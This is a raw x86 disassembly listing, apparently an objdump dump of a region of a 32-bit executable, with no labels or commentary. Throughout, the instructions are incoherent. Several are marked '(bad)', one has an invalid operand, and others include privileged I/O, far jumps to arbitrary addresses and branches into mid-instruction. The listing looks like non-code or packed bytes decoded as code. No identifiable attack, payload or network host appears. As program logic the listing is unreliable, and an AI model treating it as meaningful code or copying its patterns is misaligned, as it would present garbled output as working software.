  40af5b:	outs   dx,BYTE PTR ds:[esi]
  40af5c:	jp     0x40af8c
  40af5e:	adc    eax,0x318ff067
  40af63:	sar    ch,cl
  40af65:	xor    cl,dl
  40af67:	inc    ecx
  40af68:	pop    ecx
  40af69:	sbb    DWORD PTR [eax-0x2],eax
  40af6c:	jo     0x40afc8
  40af6e:	inc    esi
  40af6f:	repz rcl DWORD PTR [edx],cl
  40af72:	pop    ebp
  40af73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af74:	sbb    al,0x25
  40af76:	xor    ecx,0x48
  40af79:	mov    cl,0xef
  40af7b:	push   cs
  40af7c:	jno    0x40af82
  40af7e:	xchg   ebp,eax
  40af7f:	sar    BYTE PTR [esi-0x30d777c0],0xb3
  40af86:	xchg   DWORD PTR [ebx+0x4706f589],esi
  40af8c:	test   BYTE PTR [ebx+0x53],0x2f
  40af90:	xchg   ebx,eax
  40af91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af92:	out    dx,al
  40af93:	and    ah,BYTE PTR [ebp-0x26]
  40af96:	outs   dx,DWORD PTR ds:[esi]
  40af97:	sub    al,0xbb
  40af99:	data16 mov ds,WORD PTR [ebp-0x2668b27]
  40afa0:	lds    ebp,FWORD PTR [edi-0x407b58d9]
  40afa6:	sbb    bh,cl
  40afa8:	int    0xc2
  40afaa:	sub    BYTE PTR [edx],al
  40afac:	clc    
  40afad:	dec    edx
  40afae:	xchg   edx,eax
  40afaf:	mov    fs,WORD PTR [eax*2-0xac2e18b]
  40afb6:	or     al,al
  40afb8:	sub    ah,BYTE PTR [edx+0x5e]
  40afbb:	sub    dl,BYTE PTR [esi]
  40afbd:	lods   al,BYTE PTR ds:[esi]
  40afbe:	aam    0x51
  40afc0:	loopne 0x40af8c
  40afc2:	inc    ecx
  40afc3:	fiadd  WORD PTR es:[esi-0x2ec7d09a]
  40afca:	(bad)  
  40afcb:	mov    ecx,0x9edcde40
  40afd0:	push   ebx
  40afd1:	mov    edx,0x2e28d697
  40afd6:	adc    DWORD PTR ss:[edx],0xfffffff3
  40afda:	add    bl,BYTE PTR [esi]
  40afdc:	mov    eax,ds:0x7ab2846b
  40afe1:	push   esi
  40afe2:	adc    DWORD PTR [eax],ebp
  40afe4:	pop    ds
  40afe5:	call   0x9b658d60
  40afea:	mov    edi,0xa68409f8
  40afef:	cmp    DWORD PTR [edx+ebp*8],ecx
  40aff2:	jae    0x40af90
  40aff4:	pop    ebx
  40aff5:	das    
  40aff6:	sub    al,0x23
  40aff8:	addr16 lahf 
  40affa:	mov    cl,BYTE PTR [ecx+ecx*4+0x43]
  40affe:	mov    edi,0x84b477d4
  40b003:	dec    ebp
  40b004:	xchg   ebp,eax
  40b005:	xchg   edi,eax
  40b006:	shr    BYTE PTR [edx],0x68
  40b009:	dec    edi
  40b00a:	aam    0x63
  40b00c:	into   
  40b00d:	cmp    ebx,DWORD PTR [ebp-0x42]
  40b010:	cmp    ch,BYTE PTR [edx+0x67]
  40b013:	jp     0x40afba
  40b015:	retf   
  40b016:	shl    dl,cl
  40b018:	std    
  40b019:	or     al,0x69
  40b01b:	jg     0x40afd9
  40b01d:	pop    ss
  40b01e:	adc    esi,DWORD PTR [ecx+0x26470a89]
  40b024:	inc    BYTE PTR [eax+edx*2+0x5c8290e8]
  40b02b:	cld    
  40b02c:	aas    
  40b02d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b02e:	scas   al,BYTE PTR es:[edi]
  40b02f:	ins    DWORD PTR es:[edi],dx
  40b030:	jmp    DWORD PTR [esi]
  40b032:	sub    bl,bh
  40b034:	jecxz  0x40b084
  40b036:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b037:	jmp    0x93b:0x8d4b6f17
  40b03e:	leave  
  40b03f:	sar    DWORD PTR [esi+0x44c5832],cl
  40b045:	rol    DWORD PTR [edi],cl
  40b047:	or     al,0x90
  40b049:	outs   dx,DWORD PTR ds:[esi]
  40b04a:	ins    BYTE PTR es:[edi],dx
  40b04b:	scas   al,BYTE PTR es:[edi]
  40b04c:	jno    0x40b0be
  40b04e:	retf   
  40b04f:	adc    BYTE PTR [eax+edi*8+0x3a709692],cl
  40b056:	mov    esi,0xfc1fc607
  40b05b:	and    eax,0xd0096d2a
  40b060:	int3   
  40b061:	mov    BYTE PTR [edi],al
  40b063:	jbe    0x40b02a
  40b065:	fnstsw WORD PTR [ebx]
  40b067:	out    0x69,eax
  40b069:	xor    ah,BYTE PTR [edi-0x641c2c6]
  40b06f:	xchg   edx,eax
  40b070:	or     eax,0x6d1097a
  40b075:	cmp    edi,0x1b
  40b078:	popf   
  40b079:	inc    ebp
  40b07a:	pop    eax
  40b07b:	dec    esp
  40b07c:	adc    ebp,DWORD PTR [edx+0x40]
  40b07f:	jns    0x40b0fc
  40b081:	(bad)  
  40b082:	xor    eax,0xedd8eaa4
  40b087:	(bad)  [edi+eax*4]
  40b08a:	(bad)  [edx-0x2dc3a2f5]
  40b090:	fistp  QWORD PTR [esi+0x1f]
  40b093:	imul   ebx,DWORD PTR [ebp-0x71],0xffffffac
  40b097:	loop   0x40b07d
  40b099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b09a:	stc    
  40b09b:	lods   al,BYTE PTR ds:[esi]
  40b09c:	out    dx,eax
  40b09d:	cs das 
  40b09f:	pop    ebx
  40b0a0:	mov    al,0xa2
  40b0a2:	add    esi,DWORD PTR [edi]
  40b0a4:	int3   
  40b0a5:	test   DWORD PTR [ecx-0x33],edx
  40b0a8:	cld    
  40b0a9:	dec    edx
  40b0aa:	sahf   
  40b0ab:	sub    dl,al
  40b0ad:	inc    ebx
  40b0ae:	xor    BYTE PTR [ebp-0x6e3dfcbf],ch
  40b0b4:	push   edx
  40b0b5:	ins    DWORD PTR es:[edi],dx
  40b0b6:	iret   
  40b0b7:	in     eax,dx
  40b0b8:	das    
  40b0b9:	sti    
  40b0ba:	test   DWORD PTR [edi],0xdea2dcc4
  40b0c0:	xchg   edi,eax
  40b0c1:	xchg   ecx,eax
  40b0c2:	sbb    ecx,0xe34c3334
  40b0c8:	or     al,0x1c
  40b0ca:	mov    ds:0x1de04e04,eax
  40b0cf:	in     eax,dx
  40b0d0:	sbb    al,0xb1
  40b0d2:	dec    edi
  40b0d3:	in     al,0x8d
  40b0d5:	repnz sahf 
  40b0d7:	std    
  40b0d8:	and    cl,bh
  40b0da:	mov    bl,0xd5
  40b0dc:	test   DWORD PTR ds:0x16390b81,ecx
  40b0e2:	call   0xfaf5cb9e
  40b0e7:	mov    ebp,0xc8dfee7e
  40b0ec:	js     0x40b0a0
  40b0ee:	mov    dh,0x64
  40b0f0:	and    al,0xeb
  40b0f2:	adc    eax,0x86d9a0d7
  40b0f7:	mov    ecx,0x4ff7272b
  40b0fc:	sbb    DWORD PTR [ebx+0x511ff019],esi
  40b102:	stos   DWORD PTR es:[edi],eax
  40b103:	pop    ebp
  40b104:	add    eax,0xc4b003f7
  40b109:	xchg   edx,eax
  40b10a:	and    cl,BYTE PTR [di-0x3c]
  40b10e:	xor    al,0xdf
  40b110:	js     0x40b0c1
  40b112:	dec    eax
  40b113:	push   cs
  40b114:	scas   al,BYTE PTR es:[edi]
  40b115:	shr    esp,1
  40b117:	sub    edx,DWORD PTR [edi]
  40b119:	push   ebx
  40b11a:	cmp    bh,cl
  40b11c:	xchg   DWORD PTR [eax-0x3c0576ad],ebp
  40b122:	pop    ds
  40b123:	fnstsw WORD PTR [ebx]
  40b125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b126:	inc    ebx
  40b127:	call   0x32012049
  40b12c:	sub    BYTE PTR [esi],dl
  40b12e:	into   
  40b12f:	cmp    eax,0xdfd293e1
  40b134:	push   ecx
  40b135:	adc    DWORD PTR [esi+ecx*8+0x46d67d5c],edi
  40b13c:	push   DWORD PTR [ecx-0x44]
  40b13f:	mov    ds:0xe6224022,al
  40b144:	nop
  40b145:	or     al,0x13
  40b147:	(bad)  
  40b14b:	cmp    ecx,DWORD PTR [edi]
  40b14d:	outs   dx,BYTE PTR ds:[esi]
  40b14e:	scas   eax,DWORD PTR es:[edi]
  40b14f:	jne    0x40b170
  40b151:	push   cs
  40b152:	jo     0x40b119
  40b154:	outs   dx,DWORD PTR ds:[esi]
  40b155:	add    eax,0x8c759b0b
  40b15a:	and    eax,0x5fc46e3a
  40b15f:	cwde   
  40b160:	push   edx
  40b161:	nop
  40b162:	in     eax,0xa9
  40b164:	adc    ah,BYTE PTR [edi+0x14363169]
  40b16a:	enter  0xf67b,0x74
  40b16e:	out    dx,al
  40b16f:	mov    es,WORD PTR [ecx]
  40b171:	dec    ebp
  40b172:	loopne 0x40b1d7
  40b174:	rcl    DWORD PTR [edx-0x67],1
  40b177:	cmp    BYTE PTR [esi-0x2ce89894],ah
  40b17d:	out    dx,eax
  40b17e:	pop    eax
  40b17f:	popa   
  40b180:	jno    0x40b16d
  40b182:	xor    dl,BYTE PTR [esp+ebp*8]
  40b185:	je     0x40b143
  40b187:	lods   al,BYTE PTR ds:[esi]
  40b188:	jg     0x40b1a3
  40b18a:	jne    0x40b18a
  40b18c:	ret    0x72c6
  40b18f:	push   ss
  40b190:	popf   
  40b191:	push   DWORD PTR [edi+0x1f]
  40b194:	outs   dx,BYTE PTR ds:[esi]
  40b195:	jge    0x40b1fb
  40b197:	mov    ecx,0x568aa949
  40b19c:	(bad)  
  40b19d:	lea    ebp,[edi-0xa]
  40b1a0:	dec    esp
  40b1a1:	mov    dh,0x23
  40b1a3:	enter  0xdd00,0xe3
  40b1a7:	aas    
  40b1a8:	stos   BYTE PTR es:[edi],al
  40b1a9:	imul   ebp,DWORD PTR [esi],0x5539b9dc
  40b1af:	imul   esp,esp,0x69
  40b1b2:	loope  0x40b1cb
  40b1b4:	jmp    0xd0b87731
  40b1b9:	loop   0x40b215
  40b1bb:	(bad)  
  40b1bc:	fadd   DWORD PTR [ebp-0x7e]
  40b1bf:	xor    BYTE PTR [ebx],bh
  40b1c1:	push   cs
  40b1c2:	xor    al,0xa6
  40b1c4:	or     BYTE PTR [ecx*8-0x550a736a],al
  40b1cb:	xchg   BYTE PTR [edx+eiz*2],bl
  40b1ce:	not    DWORD PTR [ebx-0x58]
  40b1d1:	or     BYTE PTR [eax+0x2210c9c3],cl
  40b1d7:	push   esp
  40b1d8:	das    
  40b1d9:	shr    DWORD PTR [esi-0x3d],1
  40b1dc:	lea    edi,[ecx]
  40b1de:	ret    0xac3b
  40b1e1:	mov    al,fs:0xdc0342dc
  40b1e7:	std    
  40b1e8:	and    BYTE PTR [edi+edi*2-0x7c],dh
  40b1ec:	test   al,0xfd
  40b1ee:	push   esp
  40b1ef:	int    0x70
  40b1f1:	jne    0x40b21f
  40b1f3:	pop    ecx
  40b1f4:	push   0xffffffa4
  40b1f6:	pop    ecx
  40b1f7:	and    DWORD PTR [edx+0x3c091222],ebx
  40b1fd:	adc    BYTE PTR [ebp-0x5d],cl
  40b200:	jb     0x40b249
  40b202:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b203:	(bad)  
  40b205:	not    edi
  40b207:	adc    eax,0x3ec6f97
  40b20c:	(bad)  
  40b20d:	(bad)  
  40b20e:	jne    0x40b223
  40b210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b211:	sub    DWORD PTR [edi],0x9f680b59
  40b217:	out    0xe9,al
  40b219:	and    al,ch
  40b21b:	int    0x8f
  40b21d:	xor    DWORD PTR [ebp+0x3ae574a1],esp
  40b223:	push   edi
  40b224:	inc    ebp
  40b225:	retf   
  40b226:	daa    
  40b227:	stc    
  40b228:	mov    cl,0x4a
  40b22a:	push   0x6bf1fdfc
  40b22f:	imul   ecx,DWORD PTR [edi],0x509c5dd3
  40b235:	and    dh,cl
  40b237:	and    dh,ch
  40b239:	cmp    bl,BYTE PTR [edi+0x3ccc3844]
  40b23f:	cmp    DWORD PTR [ebx-0x729dd66],ecx
  40b245:	cwde   
  40b246:	jge    0x40b1e2
  40b248:	sub    al,0xdd
  40b24a:	fyl2xp1 
  40b24c:	sbb    BYTE PTR [ebx+0xb],dl
  40b24f:	out    0xa0,eax
  40b251:	div    BYTE PTR [ebx+0x6a]
  40b254:	xor    ch,BYTE PTR [edx-0x7b]
  40b257:	popf   
  40b258:	inc    ecx
  40b259:	ja     0x40b29e
  40b25b:	test   eax,0x1b037748
  40b260:	or     al,0x26
  40b262:	shr    eax,0xc
  40b265:	mov    bl,0x8f
  40b267:	inc    edx
  40b268:	xor    ecx,DWORD PTR [ebp+0x7b]
  40b26b:	pop    eax
  40b26c:	push   ebx
  40b26d:	repnz mov al,0x4a
  40b270:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40b272:	aas    
  40b273:	pop    ecx
  40b274:	lea    edi,[eax]
  40b276:	or     WORD PTR [eax-0x5e0b5ee3],0xa173
  40b27f:	mov    ah,0x97
  40b281:	int3   
  40b282:	jg     0x40b23e
  40b284:	loopne 0x40b23f
  40b286:	sbb    DWORD PTR [edx-0x61],edx
  40b289:	dec    esp
  40b28a:	ins    BYTE PTR es:[edi],dx
  40b28b:	cmp    al,0xdd
  40b28d:	mov    cl,0xe6
  40b28f:	push   esi
  40b290:	mov    edi,0x1c91bc84
  40b295:	jno    0x40b22e
  40b297:	dec    ecx
  40b298:	push   ecx
  40b299:	push   0x8d6b0107
  40b29e:	and    eax,0x16b0f81f
  40b2a3:	test   ebx,esi
  40b2a5:	xchg   ebx,eax
  40b2a6:	(bad)  
  40b2a7:	jnp    0x40b251
  40b2a9:	lods   al,BYTE PTR ds:[esi]
  40b2aa:	sub    al,0x7d
  40b2ac:	inc    esi
  40b2ad:	ret    
  40b2ae:	icebp  
  40b2af:	ret    0x4196
  40b2b2:	pop    esi
  40b2b3:	add    BYTE PTR [esi],bh
  40b2b5:	mov    BYTE PTR [eax+eiz*2],ch
  40b2b8:	fisubr WORD PTR [edi]
  40b2ba:	aas    
  40b2bb:	fcmove st,st(6)
  40b2bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2be:	or     ecx,DWORD PTR [ebp+eax*2-0x19]
  40b2c2:	xor    al,0x13
  40b2c4:	push   cs
  40b2c5:	cs fs out dx,al
  40b2c8:	inc    esi
  40b2c9:	test   eax,0x42a030c2
  40b2ce:	adc    al,0xed
  40b2d0:	sahf   
  40b2d1:	xchg   ecx,eax
  40b2d2:	fimul  DWORD PTR [esi+0x69c60e55]
  40b2d8:	shl    BYTE PTR [edi+0x5b],cl
  40b2db:	or     ecx,esi
  40b2dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2de:	jmp    0x7946a0a9
  40b2e3:	arpl   WORD PTR [edx+0x20],cx
  40b2e6:	test   esi,esi
  40b2e8:	and    eax,0x47946bbf
  40b2ed:	fcom   DWORD PTR [esi+0x141be2f7]
  40b2f3:	pop    eax
  40b2f4:	mov    eax,0xcbc1d5ff
  40b2f9:	imul   cl
  40b2fb:	out    0x98,eax
  40b2fd:	add    cl,BYTE PTR [eax]
  40b2ff:	inc    ecx
  40b300:	sbb    al,0x6e
  40b302:	mov    edi,0xeec61a93
  40b307:	jo     0x40b2b6
  40b309:	xor    al,0xff
  40b30b:	mov    edx,0x1addbdd3
  40b310:	aam    0xc6
  40b312:	and    cl,0xb6
  40b315:	dec    edx
  40b316:	icebp  
  40b317:	push   cs
  40b318:	jge    0x40b2cd
  40b31a:	push   ds
  40b31b:	gs mov esp,0x14f939d7
  40b321:	adc    eax,0x1d19d19a
  40b326:	(bad)  
  40b327:	mov    edx,0x606bbaf4
  40b32c:	mov    ecx,0x975256ee
  40b331:	pop    ebx
  40b332:	pop    ds
  40b333:	mov    esp,0xa60c94d5
  40b338:	mov    bh,BYTE PTR [ebx-0x72]
  40b33b:	pop    ecx
  40b33c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b33d:	sbb    cl,dh
  40b33f:	lahf   
  40b340:	sub    BYTE PTR [edx],ah
  40b342:	inc    esi
  40b343:	(bad)  
  40b344:	cs mov ch,0xeb
  40b347:	test   esi,0x89b382f8
  40b34d:	call   0xd0ae:0xa2d61f
  40b354:	outs   dx,DWORD PTR ds:[esi]
  40b355:	fist   WORD PTR [eax+0x37]
  40b358:	sub    eax,0xa6f7cc11
  40b35d:	jl     0x40b373
  40b35f:	jl     0x40b39a
  40b361:	mov    bh,0x48
  40b363:	inc    esp
  40b364:	or     al,0x45
  40b366:	repz call 0x5aa8:0x5256b101
  40b36e:	and    eax,edx
  40b370:	test   eax,0xa7570f49
  40b375:	cmp    ecx,ebx
  40b377:	mov    esi,DWORD PTR [esi]
  40b379:	in     al,dx
  40b37a:	mov    BYTE PTR [edi+0x1e9e19e4],al
  40b380:	repz fcomp QWORD PTR [edi+0x15]
  40b384:	dec    ebp
  40b385:	push   ebp
  40b386:	inc    ebx
  40b387:	cwde   
  40b388:	popf   
  40b389:	cmp    ebp,DWORD PTR [esi+esi*8+0x3f7ed7f9]
  40b390:	shl    DWORD PTR [edx],0x91
  40b393:	xchg   ebx,eax
  40b394:	push   ecx
  40b395:	push   es
  40b396:	sbb    bh,ah
  40b398:	dec    esi
  40b399:	imul   bl
  40b39b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b39c:	stos   BYTE PTR es:[edi],al
  40b39d:	mov    edx,0xaab6d493
  40b3a2:	call   0x6dad:0x3d2dc69
  40b3a9:	xor    WORD PTR [edx],dx
  40b3ac:	int    0x62
  40b3ae:	fisttp DWORD PTR [edx+0x76fc5756]
  40b3b4:	jmp    0x40b3ce
  40b3b6:	adc    DWORD PTR [esi],edx
  40b3b8:	retf   0xd77e
  40b3bb:	es dec ecx
  40b3bd:	aad    0xb2
  40b3bf:	rcl    BYTE PTR [eax+edx*1+0x767e850b],0x17
  40b3c7:	pop    ss
  40b3c8:	xor    DWORD PTR [edx],ebp
  40b3ca:	xor    eax,0x183abf33
  40b3cf:	fwait
  40b3d0:	fs popa 
  40b3d2:	and    BYTE PTR [esi+0x6b3c9474],ch
  40b3d8:	data16 out 0x86,al
  40b3db:	pop    esi
  40b3dc:	cwde   
  40b3dd:	in     al,0xe7
  40b3df:	cli    
  40b3e0:	test   al,0x12
  40b3e2:	xchg   esp,eax
  40b3e3:	in     eax,dx
  40b3e4:	(bad)  [edi+0x6819c4e3]
  40b3ea:	jle    0x40b3e1
  40b3ec:	pop    esi
  40b3ed:	or     eax,0x6df9143d
  40b3f2:	loope  0x40b405
  40b3f4:	repnz lahf 
  40b3f6:	inc    eax
  40b3f7:	mov    DWORD PTR [edi+0xd9e8a12],ebp
  40b3fd:	dec    ecx
  40b3fe:	sub    ah,dl
  40b400:	jno    0x40b3b6
  40b402:	sti    
  40b403:	enter  0x3f7e,0xfb
  40b407:	leave  
  40b408:	or     dh,bh
  40b40a:	push   0xffffff90
  40b40c:	pop    es
  40b40d:	test   eax,0xb9fdd7ea
  40b412:	jb     0x40b41e
  40b414:	outs   dx,BYTE PTR ds:[esi]
  40b415:	loope  0x40b455
  40b417:	in     eax,dx
  40b418:	mov    bl,0x10
  40b41a:	sti    
  40b41b:	mov    al,BYTE PTR [eax-0x172ca680]
  40b421:	jo     0x44e10654
  40b427:	xchg   BYTE PTR [esi-0x16],cl
  40b42a:	pushf  
  40b42b:	jge    0x40b461
  40b42d:	inc    esi
  40b42e:	xor    BYTE PTR [edi],ah
  40b430:	or     al,0x2e
  40b432:	test   DWORD PTR [edi],0xf7096564
  40b438:	pop    ebx
  40b439:	cmc    
  40b43a:	xchg   edx,eax
  40b43b:	ins    BYTE PTR es:[edi],dx
  40b43c:	popf   
  40b43d:	push   ss
  40b43e:	jae    0x40b4ae
  40b440:	or     eax,DWORD PTR [esi]
  40b442:	or     al,BYTE PTR [ebx+ebp*1+0x28]
  40b446:	(bad)  
  40b447:	jl     0x40b489
  40b449:	jge    0x40b423
  40b44b:	pushf  
  40b44c:	jne    0x40b433
  40b44e:	enter  0xff01,0xdc
  40b452:	test   eax,0xc5d7860
  40b457:	icebp  
  40b458:	jae    0x40b3dd
  40b45a:	pop    ebx
  40b45b:	or     DWORD PTR [ebx+0x62],ecx
  40b45e:	mov    ecx,0x39ac9045
  40b463:	push   0xb6f13478
  40b468:	mov    ecx,DWORD PTR [ecx]
  40b46a:	lods   al,BYTE PTR ds:[esi]
  40b46b:	out    dx,eax
  40b46c:	sti    
  40b46d:	xchg   edi,eax
  40b46e:	in     eax,dx
  40b46f:	or     al,0x83
  40b471:	(bad)  
  40b472:	repz pop edi
  40b474:	mov    bh,0xdf
  40b476:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b477:	stos   DWORD PTR es:[edi],eax
  40b478:	loopne 0x40b4f1
  40b47a:	aad    0xbf
  40b47c:	fsub   st,st(1)
  40b47e:	repz mov edi,ds
  40b481:	retf   
  40b482:	(bad)  
  40b483:	mov    ds:0xfc53d02d,al
  40b488:	pop    edx
  40b489:	fdiv   QWORD PTR [ecx-0x13]
  40b48c:	data16 jle 0x40b40f
  40b48f:	aad    0x8a
  40b491:	jle    0x40b488
  40b493:	lods   al,BYTE PTR ds:[esi]
  40b494:	retf   0xef33
  40b497:	sub    ebx,DWORD PTR [edx-0x2a]
  40b49a:	int    0x6
  40b49c:	jge    0x40b482
  40b49e:	cwde   
  40b49f:	fwait
  40b4a0:	aas    
  40b4a1:	and    eax,DWORD PTR [esi-0x53]
  40b4a4:	(bad)  
  40b4a5:	cmp    al,0x98
  40b4a7:	sti    
  40b4a8:	std    
  40b4a9:	jp     0x40b4ca
  40b4ab:	add    ah,BYTE PTR [edi+0x46d3d2c7]
  40b4b1:	fwait
  40b4b2:	ds jne 0x40b4e9
  40b4b5:	sbb    BYTE PTR [edx],ch
  40b4b7:	push   cs
  40b4b8:	dec    ebx
  40b4b9:	out    dx,eax
  40b4ba:	fwait
  40b4bb:	in     eax,0xc
  40b4bd:	fucomi st,st(0)
  40b4bf:	pop    edx
  40b4c0:	fsubp  st(4),st
  40b4c2:	out    dx,eax
  40b4c3:	enter  0xf585,0x7c
  40b4c7:	mov    cl,0xd6
  40b4c9:	jns    0x40b4c8
  40b4cb:	stos   BYTE PTR es:[edi],al
  40b4cc:	mov    ebp,0xb4b00deb
  40b4d1:	xchg   edx,eax
  40b4d2:	sahf   
  40b4d3:	sar    DWORD PTR [esi+0x39d63340],0x3e
  40b4da:	stos   DWORD PTR es:[edi],eax
  40b4db:	jecxz  0x40b4e3
  40b4dd:	int    0x5e
  40b4df:	rol    DWORD PTR [edx-0x55],0xa7
  40b4e3:	scas   al,BYTE PTR es:[edi]
  40b4e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4e5:	or     edi,edx
  40b4e7:	jl     0x40b55b
  40b4e9:	ds or  al,0xbd
  40b4ec:	xchg   esp,eax
  40b4ed:	aaa    
  40b4ee:	in     al,dx
  40b4ef:	or     edi,ecx
  40b4f1:	cmp    ch,bh
  40b4f3:	jmp    0x27b3:0xd1469101
  40b4fa:	jmp    0xe2329a3c
  40b4ff:	push   edi
  40b500:	je     0x40b529
  40b502:	add    al,0x81
  40b504:	scas   al,BYTE PTR es:[edi]
  40b505:	or     esp,DWORD PTR [edx]
  40b507:	inc    edi
  40b508:	push   ebp
  40b509:	mov    ds:0x267c295f,eax
  40b50e:	test   eax,0xe9b244ff
  40b513:	and    DWORD PTR ds:0xb814b84,0x3e
  40b51a:	pop    esp
  40b51b:	dec    ebx
  40b51c:	popa   
  40b51d:	(bad)  
  40b51e:	inc    DWORD PTR [ebx]
  40b520:	nop
  40b521:	ret    0x8335
  40b524:	ret    
  40b525:	popf   
  40b526:	adc    eax,0x7001f04e
  40b52b:	shr    dl,cl
  40b52d:	cdq    
  40b52e:	(bad)  
  40b530:	leave  
  40b531:	push   ecx
  40b532:	inc    esi
  40b533:	test   DWORD PTR [edx+0x5d631174],esp
  40b539:	hlt    
  40b53a:	sti    
  40b53b:	jnp    0x40b502
  40b53d:	rcl    BYTE PTR [edi+0x4f],cl
  40b540:	xchg   edi,eax
  40b541:	imul   edi,DWORD PTR [edx+0x22],0xfab1375
  40b548:	test   eax,0xad732242
  40b54d:	mov    eax,ds:0xac448fda
  40b552:	cmp    ah,dl
  40b554:	(bad)  
  40b556:	lahf   
  40b557:	sar    DWORD PTR [ebx-0x3f],0xd7
  40b55b:	clc    
  40b55c:	inc    edx
  40b55d:	dec    esi
  40b55e:	call   0xf666036
  40b563:	pop    es
  40b564:	js     0x40b59a
  40b566:	into   
  40b567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b568:	(bad)  
  40b56b:	int    0x76
  40b56d:	jecxz  0x40b5bd
  40b56f:	pushf  
  40b570:	push   ss
  40b571:	inc    edi
  40b572:	push   0x54
  40b574:	xor    eax,0x30b50744
  40b579:	and    al,0xe2
  40b57b:	mov    al,0x72
  40b57d:	pop    ecx
  40b57e:	nop
  40b57f:	cmp    eax,ecx
  40b581:	cwde   
  40b582:	push   esi
  40b583:	aam    0x2
  40b585:	sbb    bh,bh
  40b587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b588:	xor    eax,0x978c0ed0
  40b58d:	adc    DWORD PTR [esi+0x2d],0x78b87198
  40b594:	dec    edx
  40b595:	retf   0x102d
  40b598:	mov    BYTE PTR [eax-0x2de03380],0x84
  40b59f:	xor    ecx,ebp
  40b5a1:	pop    ecx
  40b5a2:	fnsave [eax]
  40b5a4:	jmp    0x40b556
  40b5a6:	mov    ah,0xd7
  40b5a8:	nop
  40b5a9:	xor    ah,BYTE PTR [eax+0x50]
  40b5ac:	jbe    0x40b580
  40b5ae:	test   DWORD PTR [ebp-0x60],0x589a51c7
  40b5b5:	mov    eax,ds:0x639ca509
  40b5ba:	add    al,BYTE PTR [esi-0xdd774ad]
  40b5c0:	pop    ecx
  40b5c1:	sti    
  40b5c2:	mov    ecx,0xee99aa4f
  40b5c7:	mov    ecx,0xc90cf589
  40b5cc:	popf   
  40b5cd:	lock jl 0x40b620
  40b5d0:	xchg   esp,eax
  40b5d1:	push   0x726f23e8
  40b5d6:	cmp    eax,0x625c8f9e
  40b5db:	fs mov bl,0xeb
  40b5de:	push   0xc494b827
  40b5e3:	rol    BYTE PTR [esp+edx*4],0xe3
  40b5e7:	mov    ebx,0x11bb1242
  40b5ec:	sub    cl,BYTE PTR [ecx+0x31f192f2]
  40b5f2:	dec    ebp
  40b5f3:	jno    0x40b5bb
  40b5f5:	pop    esp
  40b5f6:	mov    esi,0x6182d4ea
  40b5fb:	mov    ebx,0x9e289386
  40b600:	mov    edi,cs
  40b602:	mov    cs,WORD PTR [ebp+edx*1-0x30d832ef]
  40b609:	fst    QWORD PTR [edi-0x7c]
  40b60c:	sub    eax,0x49e79a5e
  40b611:	push   es
  40b612:	test   eax,0xea065751
  40b617:	inc    edx
  40b618:	ja     0x40b694
  40b61a:	jbe    0x40b5b8
  40b61c:	xchg   ebx,eax
  40b61d:	out    dx,eax
  40b61e:	mov    edx,0x2246bc5e
  40b623:	fisttp QWORD PTR [ecx-0x397876]
  40b629:	out    0xf2,al
  40b62b:	mov    ?,WORD PTR [edx-0xdfe3930]
  40b631:	mov    bh,0xc0
  40b633:	add    DWORD PTR [ecx-0x36],ebx
  40b636:	iret   
  40b637:	pop    ebp
  40b638:	in     eax,dx
  40b639:	cmp    cl,BYTE PTR [ecx+0x6bb880aa]
  40b63f:	int    0x6b
  40b641:	fmul   QWORD PTR [esi-0x545da457]
  40b647:	jmp    0x647d:0xe453f14
  40b64e:	scas   eax,DWORD PTR es:[edi]
  40b64f:	in     eax,dx
  40b650:	sub    al,0x7b
  40b652:	les    esi,FWORD PTR [edx]
  40b654:	pop    eax
  40b655:	and    ebx,DWORD PTR [edx]
  40b657:	and    ch,0xe2
  40b65a:	jp     0x40b630
  40b65c:	jb     0x40b63b
  40b65e:	add    BYTE PTR [edi],0x93
  40b661:	jb     0x40b6c0
  40b663:	stos   DWORD PTR es:[edi],eax
  40b664:	lea    esp,[ebx+esi*8+0x7fbaefa0]
  40b66b:	xchg   edi,eax
  40b66c:	loopne 0x40b689
  40b66e:	sbb    bh,BYTE PTR [ebx]
  40b670:	cmp    al,BYTE PTR [eax-0xb238c67]
  40b676:	adc    al,BYTE PTR [edi+0x42]
  40b679:	mov    ds:0x55fe90f1,eax
  40b67e:	add    eax,0x7f2d64b4
  40b683:	mov    ebx,esp
  40b685:	cld    
  40b686:	pop    es
  40b687:	mov    ds:0x41b9db53,al
  40b68c:	iret   
  40b68d:	mov    edi,0x40114576
  40b692:	ret    0x8a72
  40b695:	xor    dl,BYTE PTR [ebp+0x54cbef1d]
  40b69b:	and    DWORD PTR [eax],ecx
  40b69d:	fcomp  DWORD PTR [eax]
  40b69f:	push   ss
  40b6a0:	pop    esp
  40b6a1:	hlt    
  40b6a2:	push   ebp
  40b6a3:	sbb    ch,al
  40b6a5:	dec    ecx
  40b6a6:	dec    ebx
  40b6a7:	and    al,0x37
  40b6a9:	cmp    DWORD PTR [ebx-0xa492684],eax
  40b6af:	pop    edi
  40b6b0:	ja     0x40b683
  40b6b2:	fistp  WORD PTR [edi+0x5d]
  40b6b5:	mov    cl,0xea
  40b6b7:	mov    dl,0x3
  40b6b9:	retf   
  40b6ba:	xlat   BYTE PTR ds:[ebx]
  40b6bb:	out    0x30,eax
  40b6bd:	test   eax,0x6730a3b9
  40b6c2:	inc    ecx
  40b6c3:	xchg   ebp,eax
  40b6c4:	jmp    0x53b9db6f
  40b6c9:	and    al,0x74
  40b6cb:	(bad)  
  40b6cc:	jge    0x40b71a
  40b6ce:	es fdiv st(4),st
